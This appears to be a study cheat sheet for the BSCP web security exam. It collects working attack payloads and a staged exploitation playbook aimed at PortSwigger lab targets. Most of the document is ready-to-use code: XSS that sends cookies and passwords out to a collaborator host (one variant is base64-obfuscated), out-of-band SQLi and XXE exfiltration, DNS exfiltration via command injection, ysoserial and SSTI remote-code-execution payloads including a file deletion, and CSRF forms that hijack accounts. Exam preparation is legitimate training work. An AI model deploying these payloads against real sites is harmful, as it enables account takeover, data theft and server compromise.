# BSCP Exam Payloads - Complete Reference

> **Quick Navigation:** [XSS](#xss) | [SQL Injection](#sql-injection) | [CSRF](#csrf) | [XXE](#xxe) | [SSRF](#ssrf) | [Access Control](#access-control) | [Deserialization](#deserialization) | [SSTI](#ssti) | [Command Injection](#command-injection) | [Path Traversal](#path-traversal) | [Exam Patterns](#exam-patterns)

---

# XSS

## Pattern: DOM XSS via innerHTML
**Common Location:** Search, feedback forms, hash fragments

### Bypass `replace()` Filtering
```html
<><img src=x onerror=alert(1)>
```
**Why:** `replace()` only replaces first occurrence

### jQuery Hash Fragment
```html
<iframe src="https://TARGET/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

---

## Pattern: AngularJS Expression Injection
**Detection:** Look for `ng-app` directive

### Basic Alert
```
{{$on.constructor('alert(1)')()}}
```

### Cookie Exfiltration
```
{{$on.constructor('eval(atob(\'dmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpO3hoci5vcGVuKCdHRVQnLCAnaHR0cHM6Ly9DT0xMQUIub2FzdGlmeS5jb20/Yz0nK2RvY3VtZW50LmNvb2tpZSx0cnVlKTt4aHIuc2VuZCgpOw==\'))')()}}
```

---

## Pattern: Event Handler Injection
**Context:** Angle brackets encoded, attributes allowed

### Attribute Breakout
```
"> onmouseover="alert(1)
```

### Custom Tag with Focus
```html
<script>
location = 'https://TARGET/?search=<xss id=x onfocus=alert(1) tabindex=1>#x';
</script>
```

### SVG Animate
```
<svg><animatetransform onbegin=alert(1)>
```

### Body Resize
```html
<iframe src="https://TARGET/?search='<body onresize=print()>" onload=this.style.width='100px'></iframe>
```

```html
<iframe src="https://TARGET/?search=<body onresize=fetch('https://COLLAB.oastify.com?c='%2bdocument.cookie)>" onload=this.style.width='100px'></iframe>
```

---

## Pattern: JavaScript Context Escape

### String Breakout
```
';alert(1);//
```

### Template Literal
```
${alert(1)}
```

### Backslash Bypass (JSON)
```
\"-alert(1)}//
```
**Result:** `{"searchTerm":"\\"-alert(1)}//"}` - Double backslash cancels escaping

### Script Tag Closure
```
</script><script>alert(1)</script>
```

---

## Pattern: Web Message Exploitation

### PostMessage to innerHTML
```html
<iframe src="https://TARGET/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

### JavaScript URL Bypass
```html
<iframe src="https://TARGET/" onload="this.contentWindow.postMessage('javascript:print()//http://','*')">
```

### JSON.parse Sink
```html
<iframe src=https://TARGET/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\", \"url\": \"javascript:print()\"}","*")'>
```

---

## Pattern: DOM-Based Cookie Manipulation
**Context:** Cookie set via DOM, XSS in product parameter

```html
<iframe src="https://TARGET/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://TARGET';window.x=1;">
```

**How it works:**
1. First load: XSS payload in URL sets malicious cookie
2. `onload` redirects to homepage (clears URL)
3. `window.x=1` prevents infinite loop
4. Homepage uses poisoned cookie → XSS executes

---

## Pattern: CSRF Token Theft via XSS
```js
var xhr = new XMLHttpRequest();
xhr.open("GET", "/my-account", true);
xhr.onreadystatechange = function () {
    if (xhr.readyState === 4) {
        var doc = new DOMParser().parseFromString(xhr.responseText, "text/html");
        var token = doc.querySelector("input[name='csrf']").value;
        var xhr2 = new XMLHttpRequest();
        xhr2.open("POST", "/my-account/change-email", true);
        xhr2.send("email=hacker@evil.com&csrf=" + token);
    }
};
xhr.send();
```

---

## Pattern: Password Capture
```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://COLLAB.oastify.com',{
    method:'POST',
    mode:'no-cors',
    body:username.value+':'+this.value
  });">
```

---

# SQL Injection

## Pattern: Error-Based Extraction
**Common Location:** TrackingId cookie, search parameters

### CAST Technique (PostgreSQL/SQL Server)
```sql
' AND 1=CAST((SELECT password FROM users WHERE username='administrator') AS int)--
```
**Result:** Password appears in error message

---

## Pattern: Blind SQLi - Out-of-Band

### MS SQL Server
```sql
'; exec master..xp_dirtree '//COLLAB.oastify.com/a'--
```

### Oracle - Data Exfiltration
```sql
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.COLLAB.oastify.com/"> %remote;]>'),'/l') FROM dual--
```

---

## Pattern: XML-Based SQLi with WAF
**Use Hackvertor extension**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId><@dec_entities>1 UNION SELECT password FROM users WHERE username='administrator'-- -</@dec_entities></productId>
  <storeId>1</storeId>
</stockCheck>
```

---

# CSRF

## Pattern: Referer Bypass

### Remove Referer Header
```html
<html>
<meta name="referrer" content="never">
  <body>
    <form action="https://TARGET/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker@evil.com" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### Referer Validation Bypass
```html
<script>
history.pushState('', '', '/?TARGET.web-security-academy.net');
document.forms[0].submit();
</script>
```

---

## Pattern: Token Duplication via CRLF
```html
<html>
  <body>
    <form action="https://TARGET/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker@evil.com" />
      <input type="hidden" name="csrf" value="fake" />
    </form>
    <img src="https://TARGET/?search=x%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite%3dNone" onerror="document.forms[0].submit();">
  </body>
</html>
```

---

## Pattern: SameSite Bypass via OAuth Refresh
```html
<script>
window.onclick = () => {
  window.open('https://TARGET/social-login');
  setTimeout(() => document.forms[0].submit(), 5000);
}
</script>
```

---

# XXE

## Pattern: Blind XXE with External DTD
**Common Location:** Stock check XML

### Main Request
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % ext SYSTEM "https://EXPLOIT-SERVER/exploit.dtd"> %ext; ]>
<stockCheck><productId>2</productId><storeId>3</storeId></stockCheck>
```

### External DTD (Host on exploit server)
```xml
<!ENTITY % file SYSTEM "file:///home/carlos/secret">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLAB.oastify.com/?x=%file;'>">
%eval;
%exfil;
```

**Note:** `&#x25;` = `%` (required for nested entities)

---

# SSRF

## Pattern: Routing-Based SSRF
**Common Location:** Host header

### Step 1: Enumerate Internal IPs (Burp Intruder)
```
GET /admin HTTP/2
Host: 192.168.0.§1§
```
**Range:** 0-255

### Step 2: Access Admin Panel
```
GET /admin/delete?username=carlos&csrf=TOKEN HTTP/2
Host: 192.168.0.113
```

---

## Pattern: Absolute URL Bypass
```
GET https://TARGET/admin/delete?username=carlos HTTP/2
Host: 192.168.0.108
```

---

## Pattern: Localhost Bypass
```
GET /admin/delete?username=carlos HTTP/2
Host: localhost
```

---

## Pattern: Connection State Attack
**Burp Repeater: Send group in sequence (single connection)**

**Request 1:**
```
GET / HTTP/1.1
Host: TARGET.web-security-academy.net
Connection: keep-alive
```

**Request 2:**
```
GET /admin HTTP/1.1
Host: 192.168.0.1
Connection: keep-alive
```

---

## Pattern: Cache Poisoning via Duplicate Host
```
GET / HTTP/1.1
Host: TARGET.web-security-academy.net
Host: EXPLOIT-SERVER.net
```

---

# Access Control

## Pattern: Referer-Based Bypass
```
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Cookie: session=WIENER_SESSION
Referer: https://TARGET/admin
```

---

## Pattern: Method Conversion
**POST → GET**
```
GET /admin-roles?username=wiener&action=upgrade HTTP/2
```

---

## Pattern: Multi-Step Bypass
**Skip to confirmation step**
```
POST /admin-roles HTTP/2

action=upgrade&confirmed=true&username=wiener
```

---

## Pattern: IDOR with Hidden Parameters
```json
POST /my-account HTTP/2
Content-Type: application/json

{
  "email": "wiener@example.com",
  "roleid": 2
}
```
**Brute-force `roleid` 1-10 with Intruder**

---

# Deserialization

## Pattern: PHP Type Juggling
```php
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```
**Why:** `0 == "any_string"` → `true` in PHP

---

## Pattern: Java ysoserial
```bash
java -jar ysoserial.jar \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
  --add-opens=java.base/java.net=ALL-UNNAMED \
  --add-opens=java.base/java.util=ALL-UNNAMED \
  CommonsCollections7 'nslookup $(cat /home/carlos/morale.txt).COLLAB.oastify.com'
```
**Output:** Base64-encode and set as cookie

---

# SSTI

## Pattern: Template Detection
```
{{7*7}}
${7*7}
<%= 7*7 %>
```

---

## Pattern: Jinja2 (Python)
```python
{{ ''.__class__.__mro__[1].__subclasses__()[396]('/home/carlos/secret').read() }}
```

---

## Pattern: Freemarker (Java)
```java
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat /home/carlos/secret") }
```

---

## Pattern: Handlebars (Node.js)
```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

---

# Command Injection

## Pattern: DNS Exfiltration
```bash
||nslookup $(cat /home/carlos/secret).COLLAB.oastify.com||
```

---

# Path Traversal

## Pattern: Double URL Encoding
```
..%252f..%252f..%252fhome%252fcarlos%252fsecret
```

---

# Exam Patterns

## Stage 1: Get Access to Any User

### Pattern 1: DOM XSS → Cookie Theft
1. Find search/feedback form
2. Test for DOM XSS: `<><img src=x onerror=alert(1)>`
3. Steal cookie: `<><img src=x onerror="fetch('https://COLLAB.oastify.com?c='+document.cookie)">`
4. Use stolen cookie to login

### Pattern 2: Stored XSS → Session Hijack
1. Find comment/feedback functionality
2. Test stored XSS in website field: `javascript:alert(1)`
3. Admin views comment → session stolen

### Pattern 3: CSRF → Password Reset
1. Find email change functionality
2. Test CSRF bypasses (method change, remove token, Referer bypass)
3. Change admin email to yours
4. Reset admin password
5. Login as admin

---

## Stage 2: Privilege Escalation

### Pattern 1: SQL Injection → Admin Credentials
1. Look for "Advanced Search" page
2. Use SQLMap: `sqlmap -r request.txt --level 5 --risk 3 --batch --dump`
3. Extract admin password
4. Login as admin

### Pattern 2: Error-Based SQLi (Manual)
1. Find TrackingId cookie or search parameter
2. Test: `' AND 1=CAST((SELECT password FROM users WHERE username='administrator') AS int)--`
3. Password appears in error message

### Pattern 3: JSON Role Manipulation
1. Update profile, intercept request
2. Add hidden parameter: `"roleid": 2` or `"isAdmin": true`
3. Brute-force roleid values with Intruder

### Pattern 4: Access Control Bypass
1. Find admin functionality
2. Try as low-priv user with:
   - POST → GET conversion
   - Referer: `/admin`
   - Skip to confirmation step (`confirmed=true`)

### Pattern 5: Deserialization Cookie Tampering
1. Decode session cookie (Base64)
2. Modify: `"isAdmin":b:1` or `"access_token":i:0`
3. Re-encode and replace cookie

---

## Stage 3: File System Access

### Pattern 1: XXE → Read `/home/carlos/secret`
1. Find stock check XML request
2. Host external DTD on exploit server
3. Use blind XXE with OOB exfiltration
4. Check Burp Collaborator for secret

### Pattern 2: SSRF → Internal Service
1. Find Host header or URL parameter
2. Enumerate internal IPs: `192.168.0.1-255`
3. Access `localhost:6566/home/carlos/secret`

### Pattern 3: Command Injection → DNS Exfiltration
1. Find feedback form or email field
2. Test: `||nslookup $(cat /home/carlos/secret).COLLAB.oastify.com||`
3. Check Burp Collaborator DNS logs

### Pattern 4: SSTI → RCE
1. Test template expressions: `{{7*7}}`, `${7*7}`
2. Identify engine (Jinja2, Freemarker, etc.)
3. Use engine-specific RCE payload
4. Read `/home/carlos/secret`

---

## Common Exam Locations

| Vulnerability | Primary Location | Secondary Location |
|---------------|------------------|-------------------|
| XSS | Search bar, feedback form | Comments, profile |
| SQL Injection | Advanced search, TrackingId cookie | Product filter |
| CSRF | Email change | Password change |
| XXE | Stock check XML | File upload |
| SSRF | Host header, stock check | Admin panel features |
| Access Control | Admin panel | Profile update |
| SSTI | Product details | Error messages |
| Command Injection | Feedback email field | File upload |
| Path Traversal | Image parameter | File download |

---

## Quick Checklist

**Stage 1:**
- [ ] Test search for DOM XSS
- [ ] Test comments for stored XSS
- [ ] Test email change for CSRF
- [ ] Check for AngularJS (`ng-app`)

**Stage 2:**
- [ ] Look for "Advanced Search" → SQLMap
- [ ] Test TrackingId cookie for SQLi
- [ ] Inspect profile JSON for hidden parameters
- [ ] Try POST → GET on admin functions
- [ ] Decode session cookie for deserialization

**Stage 3:**
- [ ] Scan stock check XML for XXE
- [ ] Enumerate internal IPs for SSRF
- [ ] Test feedback email for command injection
- [ ] Test template expressions for SSTI
- [ ] Try DNS exfiltration for blind vulnerabilities
